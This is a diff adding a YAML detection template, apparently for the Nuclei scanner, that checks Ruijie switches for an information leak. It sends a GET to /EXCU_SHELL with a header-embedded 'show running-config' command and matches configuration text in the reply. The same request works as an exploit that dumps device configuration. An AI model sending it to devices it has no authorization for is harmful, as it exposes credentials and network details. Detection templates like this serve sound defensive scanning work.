@@ -1,0 +1,28 @@
+id: ruijie-switch-web-management-system-info-leak
+info:
+  name: Ruijie Switch Web Management System EXCU_SHELL Information Leak
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: information-disclosure
+http:
+  - raw:
+      - |
+        GET /EXCU_SHELL HTTP/1.1
+        Host: {{Hostname}}
+        Cmdnum: 1
+        Command1: show running-config
+        Confirm1: n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Building configuration"
+          - "Current configuration"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
